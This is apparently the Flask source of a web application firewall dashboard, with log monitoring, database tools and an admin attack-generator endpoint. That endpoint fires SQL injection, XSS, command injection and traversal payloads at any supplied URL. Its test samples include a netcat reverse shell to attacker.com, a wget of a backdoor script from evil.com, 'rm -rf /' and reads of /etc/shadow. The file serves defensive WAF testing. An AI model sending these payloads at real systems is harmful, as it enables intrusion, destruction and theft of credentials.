from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify, Response
from werkzeug.security import check_password_hash
from middleware import waf_middleware
from database import get_user_by_username, init_db, get_attack_stats, get_recent_logs, get_connection, create_user
from ultra_anomaly_detection import UltraAnomalyDetector, AnomalyDetector
import os
import shutil
from datetime import datetime
from functools import wraps
import requests
import time

app = Flask(__name__)
app.secret_key = "replace-with-a-secure-random-secret"

# Initialize DB
init_db()

# Apply WAF middleware
waf_middleware(app)

# Admin decorator
def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if "user_id" not in session:
            flash("Please log in to continue", "warning")
            return redirect(url_for('login'))
        if not session.get('is_admin', False):
            flash("Access denied. Admin privileges required.", "danger")
            return redirect(url_for('dashboard'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def index():
    if "user_id" in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if "user_id" in session:
        return redirect(url_for('dashboard'))

    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        user = get_user_by_username(username)
        if not user:
            flash("Invalid username or password", "danger")
            return render_template('login.html', username=username)

        user_id, db_username, db_password_hash, is_admin = user

        if check_password_hash(db_password_hash, password):
            session['user_id'] = user_id
            session['username'] = db_username
            session['is_admin'] = bool(is_admin)
            flash("Login successful", "success")
            return redirect(url_for('dashboard'))
        else:
            flash("Invalid username or password", "danger")
            return render_template('login.html', username=username)

    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if "user_id" not in session:
        flash("Please log in to continue", "warning")
        return redirect(url_for('login'))
    return render_template('dashboard.html', username=session.get('username'))

@app.route('/monitor')
def monitor():
    if "user_id" not in session:
        flash("Please log in to continue", "warning")
        return redirect(url_for('login'))
    
    stats = get_attack_stats()
    recent_logs = get_recent_logs(limit=50)
    
    return render_template('monitor.html', 
                         username=session.get('username'),
                         stats=stats,
                         logs=recent_logs)

@app.route('/tools')
def tools():
    if "user_id" not in session:
        flash("Please log in to continue", "warning")
        return redirect(url_for('login'))
    
    conn = get_connection()
    cursor = conn.cursor()
    
    cursor.execute("SELECT COUNT(*) FROM logs")
    total_logs = cursor.fetchone()[0]
    
    cursor.execute("SELECT DISTINCT type FROM logs ORDER BY type")
    attack_types = [row[0] for row in cursor.fetchall()]
    
    cursor.execute("""
        SELECT ip, COUNT(*) as count 
        FROM logs 
        GROUP BY ip 
        ORDER BY count DESC 
        LIMIT 10
    """)
    top_ips = [dict(row) for row in cursor.fetchall()]
    
    conn.close()
    
    return render_template('tools.html', 
                         username=session.get('username'),
                         total_logs=total_logs,
                         attack_types=attack_types,
                         top_ips=top_ips)

# ==========================================
# DATABASE MANAGEMENT API
# ==========================================

@app.route('/api/db/stats')
def api_db_stats():
    if "user_id" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    conn = get_connection()
    cursor = conn.cursor()
    
    cursor.execute("SELECT COUNT(*) FROM logs")
    total = cursor.fetchone()[0]
    
    cursor.execute("SELECT type, COUNT(*) as count FROM logs GROUP BY type ORDER BY count DESC")
    by_type = [{"type": row[0], "count": row[1]} for row in cursor.fetchall()]
    
    conn.close()
    
    return jsonify({"total": total, "by_type": by_type})

@app.route('/api/db/clear', methods=['POST'])
def api_clear_logs():
    if "user_id" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.get_json()
    clear_type = data.get('type', 'all')
    
    conn = get_connection()
    cursor = conn.cursor()
    
    try:
        if clear_type == 'all':
            cursor.execute("SELECT COUNT(*) FROM logs")
            count = cursor.fetchone()[0]
            cursor.execute("DELETE FROM logs")
            conn.commit()
            message = f"Deleted {count} log entries"
        
        elif clear_type == 'by_attack_type':
            attack_type = data.get('attack_type')
            cursor.execute("SELECT COUNT(*) FROM logs WHERE type = ?", (attack_type,))
            count = cursor.fetchone()[0]
            cursor.execute("DELETE FROM logs WHERE type = ?", (attack_type,))
            conn.commit()
            message = f"Deleted {count} '{attack_type}' entries"
        
        elif clear_type == 'by_ip':
            ip = data.get('ip')
            cursor.execute("SELECT COUNT(*) FROM logs WHERE ip = ?", (ip,))
            count = cursor.fetchone()[0]
            cursor.execute("DELETE FROM logs WHERE ip = ?", (ip,))
            conn.commit()
            message = f"Deleted {count} entries from {ip}"
        
        else:
            return jsonify({"error": "Invalid clear type"}), 400
        
        conn.close()
        return jsonify({"success": True, "message": message, "deleted": count})
    
    except Exception as e:
        conn.close()
        return jsonify({"error": str(e)}), 500

@app.route('/api/db/backup', methods=['POST'])
def api_backup_db():
    if "user_id" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    backup_dir = "backups"
    db_file = "app_data.db"
    
    if not os.path.exists(backup_dir):
        os.makedirs(backup_dir)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_file = os.path.join(backup_dir, f"app_data_backup_{timestamp}.db")
    
    try:
        shutil.copy2(db_file, backup_file)
        file_size = os.path.getsize(backup_file)
        return jsonify({
            "success": True,
            "message": "Backup created successfully",
            "filename": os.path.basename(backup_file),
            "size": file_size
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/db/export', methods=['GET'])
def api_export_csv():
    if "user_id" not in session:
        flash("Please log in to continue", "warning")
        return redirect(url_for('login'))
    
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id, time, ip, type, payload, path, user_agent FROM logs ORDER BY id")
    
    csv_lines = ["ID,Time,IP,Type,Payload,Path,User_Agent"]
    for row in cursor.fetchall():
        row_escaped = [str(field).replace('"', '""') for field in row]
        line = ','.join([f'"{field}"' for field in row_escaped])
        csv_lines.append(line)
    
    conn.close()
    
    csv_content = '\n'.join(csv_lines)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"attack_logs_{timestamp}.csv"
    
    return Response(
        csv_content,
        mimetype="text/csv",
        headers={"Content-disposition": f"attachment; filename={filename}"}
    )

@app.route('/api/logs')
def api_logs():
    if "user_id" not in session:
        return {"error": "Unauthorized"}, 401
    
    limit = request.args.get('limit', 100, type=int)
    offset = request.args.get('offset', 0, type=int)
    attack_type = request.args.get('type', None)
    
    logs = get_recent_logs(limit=limit, offset=offset, attack_type=attack_type)
    return {"logs": [dict(log) for log in logs]}

# ==========================================
# ADMIN PANEL ROUTES
# ==========================================

@app.route('/admin/attack-generator')
@admin_required
def admin_attack_generator():
    return render_template('admin_attack_generator.html', username=session.get('username'))

@app.route('/admin/anomaly-testing')
@admin_required
def admin_anomaly_testing():
    return render_template('admin_anomaly_testing.html', username=session.get('username'))

@app.route('/admin/user-management')
@admin_required
def admin_user_management():
    return render_template('admin_user_management.html', username=session.get('username'))

# Attack Generator API
@app.route('/api/admin/generate-attacks', methods=['POST'])
@admin_required
def api_generate_attacks():
    data = request.get_json()
    category = data.get('category', 'all')
    target_url = data.get('target_url', 'http://127.0.0.1:5000')

    # Define attack payloads
    attacks = {
        'sql': [
            ("/search", {"q": "' UNION SELECT * FROM users--"}),
            ("/product", {"id": "1' OR '1'='1"}),
            ("/filter", {"category": "books' OR 1=1--"}),
            ("/login", {"username": "admin'--", "password": "test"}),
            ("/api/data", {"query": "SELECT * WHERE id='1' UNION"}),
        ],
        'xss': [
            ("/search", {"q": "<script>alert(1)</script>"}),
            ("/comment", {"text": "<img src=x onerror=alert(1)>"}),
            ("/input", {"data": "<svg onload=alert(1)>"}),
            ("/profile", {"bio": "<body onload=alert(1)>"}),
            ("/page", {"content": "<iframe src=javascript:alert(1)>"}),
        ],
        'cmd': [
            ("/exec", {"cmd": "; cat /etc/passwd"}),
            ("/run", {"command": "| ls -la"}),
            ("/ping", {"host": "127.0.0.1; whoami"}),
            ("/system", {"input": "$(uname -a)"}),
            ("/diag", {"tool": "traceroute && cat /etc/hosts"}),
        ],
        'traversal': [
            ("/files", {"path": "../../../../etc/passwd"}),
            ("/download", {"file": "../../windows/system32/config"}),
            ("/include", {"page": "../../../etc/shadow"}),
            ("/view", {"doc": "../../var/log/auth.log"}),
        ],
        'file': [
            ("/include", {"file": "php://filter/resource=/etc/passwd"}),
            ("/load", {"url": "file:///etc/hosts"}),
            ("/page", {"include": "../../../../config.php"}),
        ]
    }

    # Get attacks based on category
    if category == "all":
        selected_attacks = []
        for attacks_list in attacks.values():
            selected_attacks.extend(attacks_list)
    else:
        selected_attacks = attacks.get(category, [])

    # Send attacks
    results = []
    for path, params in selected_attacks:
        try:
            url = target_url + path
            response = requests.get(url, params=params, timeout=5)
            is_blocked = response.status_code == 403
            results.append({
                'path': path,
                'payload': list(params.values())[0] if params else '',
                'blocked': is_blocked,
                'status_code': response.status_code
            })
        except Exception as e:
            results.append({
                'path': path,
                'payload': list(params.values())[0] if params else '',
                'blocked': False,
                'error': str(e)
            })
        time.sleep(0.1)  # Small delay between requests

    return jsonify({'results': results})

# Anomaly Testing API
@app.route('/api/admin/run-anomaly-test', methods=['POST'])
@admin_required
def api_run_anomaly_test():
    data = request.get_json()
    threshold = data.get('threshold', 75)

    # Get test samples (same as GUI)
    normal_samples = get_normal_samples()
    malicious_samples = get_malicious_samples()

    # Create and train detector
    detector = AnomalyDetector()
    detector.train_baseline(normal_samples[:30])

    # Test metrics
    true_positives = 0
    false_positives = 0
    true_negatives = 0
    false_negatives = 0

    normal_results = []
    malicious_results = []

    # Test normal traffic (last 20 samples)
    for sample in normal_samples[30:]:
        is_anom, score, details = detector.is_anomalous(sample, threshold=threshold)
        if is_anom:
            false_positives += 1
            normal_results.append({'sample': sample['path'], 'score': score, 'result': 'FP'})
        else:
            true_negatives += 1
            normal_results.append({'sample': sample['path'], 'score': score, 'result': 'TN'})

    # Test malicious traffic
    for sample in malicious_samples:
        is_anom, score, details = detector.is_anomalous(sample, threshold=threshold)
        if is_anom:
            true_positives += 1
            malicious_results.append({'sample': sample['path'], 'score': score, 'result': 'TP'})
        else:
            false_negatives += 1
            malicious_results.append({'sample': sample['path'], 'score': score, 'result': 'FN'})

    # Calculate metrics
    total = true_positives + false_positives + true_negatives + false_negatives
    accuracy = (true_positives + true_negatives) / total * 100 if total > 0 else 0
    precision = true_positives / (true_positives + false_positives) * 100 if (true_positives + false_positives) > 0 else 0
    recall = true_positives / (true_positives + false_negatives) * 100 if (true_positives + false_negatives) > 0 else 0
    f1_score = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
    specificity = true_negatives / (true_negatives + false_positives) * 100 if (true_negatives + false_positives) > 0 else 0

    return jsonify({
        'metrics': {
            'total': total,
            'true_positives': true_positives,
            'false_positives': false_positives,
            'true_negatives': true_negatives,
            'false_negatives': false_negatives,
            'accuracy': round(accuracy, 2),
            'precision': round(precision, 2),
            'recall': round(recall, 2),
            'f1_score': round(f1_score, 2),
            'specificity': round(specificity, 2)
        },
        'normal_results': normal_results,
        'malicious_results': malicious_results
    })

# User Management API
@app.route('/api/admin/create-user', methods=['POST'])
@admin_required
def api_create_user():
    data = request.get_json()
    username = data.get('username', '').strip()
    password = data.get('password', '')
    is_admin = data.get('is_admin', False)

    if not username:
        return jsonify({'success': False, 'error': 'Username cannot be empty'}), 400

    if not password:
        return jsonify({'success': False, 'error': 'Password cannot be empty'}), 400

    if len(password) < 4:
        return jsonify({'success': False, 'error': 'Password must be at least 4 characters'}), 400

    try:
        create_user(username, password, is_admin)
        return jsonify({'success': True, 'message': f'User "{username}" created successfully'})
    except Exception as e:
        error_msg = str(e)
        if "UNIQUE constraint failed" in error_msg:
            return jsonify({'success': False, 'error': f'Username "{username}" already exists'}), 400
        return jsonify({'success': False, 'error': error_msg}), 500

def get_normal_samples():
    """Get normal traffic samples for anomaly testing"""
    return [
        {'ip': '192.168.1.10', 'path': '/login', 'payload': 'username=john&password=pass123', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/login', 'payload': 'username=alice&password=secret456', 'timestamp': time.time()},
        {'ip': '192.168.1.12', 'path': '/login', 'payload': 'username=bob&password=mypass789', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/dashboard', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/dashboard', 'payload': '', 'timestamp': time.time() + 5},
        {'ip': '192.168.1.12', 'path': '/dashboard', 'payload': '', 'timestamp': time.time() + 10},
        {'ip': '192.168.1.10', 'path': '/dashboard', 'payload': '', 'timestamp': time.time() + 15},
        {'ip': '192.168.1.13', 'path': '/dashboard', 'payload': '', 'timestamp': time.time() + 20},
        {'ip': '192.168.1.10', 'path': '/monitor', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/monitor', 'payload': '', 'timestamp': time.time() + 7},
        {'ip': '192.168.1.10', 'path': '/profile', 'payload': 'name=John Doe&email=john@example.com', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/profile', 'payload': 'name=Alice Smith&bio=Developer', 'timestamp': time.time()},
        {'ip': '192.168.1.12', 'path': '/profile', 'payload': 'name=Bob Jones&phone=1234567890', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/search', 'payload': 'query=cybersecurity', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/search', 'payload': 'query=web application', 'timestamp': time.time()},
        {'ip': '192.168.1.12', 'path': '/search', 'payload': 'query=firewall tutorial', 'timestamp': time.time()},
        {'ip': '192.168.1.13', 'path': '/search', 'payload': 'query=python programming', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/api/logs', 'payload': 'limit=50&offset=0', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/api/logs', 'payload': 'limit=100', 'timestamp': time.time()},
        {'ip': '192.168.1.12', 'path': '/api/logs', 'payload': 'type=SQL Injection', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/contact', 'payload': 'name=User&message=Hello world', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/feedback', 'payload': 'rating=5&comment=Great app', 'timestamp': time.time()},
        {'ip': '192.168.1.12', 'path': '/support', 'payload': 'issue=Login problem', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/', 'payload': '', 'timestamp': time.time() + 2},
        {'ip': '192.168.1.12', 'path': '/', 'payload': '', 'timestamp': time.time() + 4},
        {'ip': '192.168.1.10', 'path': '/logout', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/logout', 'payload': '', 'timestamp': time.time() + 3},
        {'ip': '192.168.1.10', 'path': '/settings', 'payload': 'theme=dark&language=en', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/settings', 'payload': 'notifications=true', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/download/report.pdf', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/download/data.csv', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/change-password', 'payload': 'old=pass123&new=newpass456', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/verify', 'payload': 'token=abc123def456', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/upload', 'payload': 'file=avatar.jpg&size=50KB', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/calendar', 'payload': 'date=2025-11-07', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/help', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/help/faq', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/about', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/terms', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/privacy', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/blog/security', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/blog/waf-guide', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/comment', 'payload': 'post_id=123&text=Great', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/comment', 'payload': 'post_id=124&text=Helpful', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/cart', 'payload': 'action=add&item_id=456', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/cart', 'payload': 'action=remove&item_id=457', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/checkout', 'payload': 'total=99.99&method=credit', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/orders', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/invoice/123', 'payload': '', 'timestamp': time.time()},
    ]

def get_malicious_samples():
    """Get malicious traffic samples for anomaly testing"""
    return [
        # SQL Injection (15)
        {'ip': '10.0.0.5', 'path': '/search', 'payload': "query=' OR '1'='1' --", 'timestamp': time.time()},
        {'ip': '10.0.0.5', 'path': '/search', 'payload': "query=1' UNION SELECT username,password FROM users--", 'timestamp': time.time()},
        {'ip': '10.0.0.5', 'path': '/login', 'payload': "username=admin'--&password=anything", 'timestamp': time.time()},
        {'ip': '10.0.0.6', 'path': '/product', 'payload': "id=1' AND 1=1--", 'timestamp': time.time()},
        {'ip': '10.0.0.6', 'path': '/user', 'payload': "id=1' OR '1'='1", 'timestamp': time.time()},
        {'ip': '10.0.0.7', 'path': '/search', 'payload': "query='; DROP TABLE users--", 'timestamp': time.time()},
        {'ip': '10.0.0.7', 'path': '/api', 'payload': "param=1' UNION ALL SELECT database(),user()--", 'timestamp': time.time()},
        {'ip': '10.0.0.8', 'path': '/filter', 'payload': "category=books' OR 1=1 LIMIT 1--", 'timestamp': time.time()},
        {'ip': '10.0.0.8', 'path': '/report', 'payload': "id=1'; EXEC xp_cmdshell('dir')--", 'timestamp': time.time()},
        {'ip': '10.0.0.9', 'path': '/search', 'payload': "q=test' AND SLEEP(5)--", 'timestamp': time.time()},
        {'ip': '10.0.0.9', 'path': '/data', 'payload': "filter=1' AND BENCHMARK(5000000,MD5('A'))--", 'timestamp': time.time()},
        {'ip': '10.0.0.10', 'path': '/view', 'payload': "id=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", 'timestamp': time.time()},
        {'ip': '10.0.0.10', 'path': '/page', 'payload': "id=1' UNION SELECT NULL,NULL,NULL--", 'timestamp': time.time()},
        {'ip': '10.0.0.11', 'path': '/search', 'payload': "q=admin' AND extractvalue(1,concat(0x7e,database()))--", 'timestamp': time.time()},
        {'ip': '10.0.0.11', 'path': '/login', 'payload': "user=' OR '1'='1'/*&pass=anything", 'timestamp': time.time()},

        # XSS (15)
        {'ip': '10.0.0.12', 'path': '/search', 'payload': 'query=<script>alert(1)</script>', 'timestamp': time.time()},
        {'ip': '10.0.0.12', 'path': '/comment', 'payload': 'text=<img src=x onerror=alert(document.cookie)>', 'timestamp': time.time()},
        {'ip': '10.0.0.13', 'path': '/profile', 'payload': 'bio=<svg onload=alert(1)>', 'timestamp': time.time()},
        {'ip': '10.0.0.13', 'path': '/input', 'payload': 'data=<body onload=alert(1)>', 'timestamp': time.time()},
        {'ip': '10.0.0.14', 'path': '/page', 'payload': 'content=<iframe src=javascript:alert(1)>', 'timestamp': time.time()},
        {'ip': '10.0.0.14', 'path': '/post', 'payload': 'title=<script>document.location="http://evil.com"</script>', 'timestamp': time.time()},
        {'ip': '10.0.0.15', 'path': '/submit', 'payload': 'text=<img src=x onerror=eval(atob("YWxlcnQoMSk="))>', 'timestamp': time.time()},
        {'ip': '10.0.0.15', 'path': '/form', 'payload': 'input="><script>alert(String.fromCharCode(88,83,83))</script>', 'timestamp': time.time()},
        {'ip': '10.0.0.16', 'path': '/msg', 'payload': 'message=<svg><script>alert(1)</script></svg>', 'timestamp': time.time()},
        {'ip': '10.0.0.16', 'path': '/edit', 'payload': 'content=<object data="javascript:alert(1)">', 'timestamp': time.time()},
        {'ip': '10.0.0.17', 'path': '/upload', 'payload': 'file=<embed src="javascript:alert(1)">', 'timestamp': time.time()},
        {'ip': '10.0.0.17', 'path': '/create', 'payload': 'html=<meta http-equiv="refresh" content="0;url=javascript:alert(1)">', 'timestamp': time.time()},
        {'ip': '10.0.0.18', 'path': '/update', 'payload': 'style=<style>*{background:url("javascript:alert(1)")}</style>', 'timestamp': time.time()},
        {'ip': '10.0.0.18', 'path': '/render', 'payload': 'template=<link rel="stylesheet" href="javascript:alert(1)">', 'timestamp': time.time()},
        {'ip': '10.0.0.19', 'path': '/parse', 'payload': 'xml=<xml><script>alert(1)</script></xml>', 'timestamp': time.time()},

        # Command Injection (10)
        {'ip': '10.0.0.20', 'path': '/exec', 'payload': 'cmd=; cat /etc/passwd', 'timestamp': time.time()},
        {'ip': '10.0.0.20', 'path': '/run', 'payload': 'command=| ls -la', 'timestamp': time.time()},
        {'ip': '10.0.0.21', 'path': '/api/exec', 'payload': 'input=`whoami`', 'timestamp': time.time()},
        {'ip': '10.0.0.21', 'path': '/system', 'payload': 'cmd=$(id)', 'timestamp': time.time()},
        {'ip': '10.0.0.22', 'path': '/ping', 'payload': 'host=127.0.0.1; nc -e /bin/bash attacker.com 4444', 'timestamp': time.time()},
        {'ip': '10.0.0.22', 'path': '/diag', 'payload': 'tool=traceroute && wget http://evil.com/backdoor.sh', 'timestamp': time.time()},
        {'ip': '10.0.0.23', 'path': '/cmd', 'payload': 'exec=127.0.0.1 | bash -i', 'timestamp': time.time()},
        {'ip': '10.0.0.23', 'path': '/shell', 'payload': 'input=; rm -rf /', 'timestamp': time.time()},
        {'ip': '10.0.0.24', 'path': '/execute', 'payload': 'cmd=python -c "import os; os.system(\\"ls\\")"', 'timestamp': time.time()},
        {'ip': '10.0.0.24', 'path': '/run', 'payload': 'command=perl -e "exec \\"/bin/bash\\""', 'timestamp': time.time()},

        # Directory Traversal (10)
        {'ip': '10.0.0.25', 'path': '/files', 'payload': 'path=../../../../etc/passwd', 'timestamp': time.time()},
        {'ip': '10.0.0.25', 'path': '/download', 'payload': 'file=..\\..\\..\\windows\\system32\\config\\sam', 'timestamp': time.time()},
        {'ip': '10.0.0.26', 'path': '/include', 'payload': 'page=php://filter/resource=/etc/passwd', 'timestamp': time.time()},
        {'ip': '10.0.0.26', 'path': '/read', 'payload': 'file=....//....//....//etc/shadow', 'timestamp': time.time()},
        {'ip': '10.0.0.27', 'path': '/view', 'payload': 'doc=../../../../../../proc/self/environ', 'timestamp': time.time()},
        {'ip': '10.0.0.27', 'path': '/show', 'payload': 'file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'timestamp': time.time()},
        {'ip': '10.0.0.28', 'path': '/get', 'payload': 'path=..%252f..%252f..%252fetc%252fpasswd', 'timestamp': time.time()},
        {'ip': '10.0.0.28', 'path': '/load', 'payload': 'file=c:\\windows\\win.ini', 'timestamp': time.time()},
        {'ip': '10.0.0.29', 'path': '/open', 'payload': 'doc=/var/www/../../etc/passwd', 'timestamp': time.time()},
        {'ip': '10.0.0.29', 'path': '/fetch', 'payload': 'resource=file:///etc/passwd', 'timestamp': time.time()},
    ]

@app.route('/logout')
def logout():
    session.clear()
    flash("Logged out", "info")
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug=True)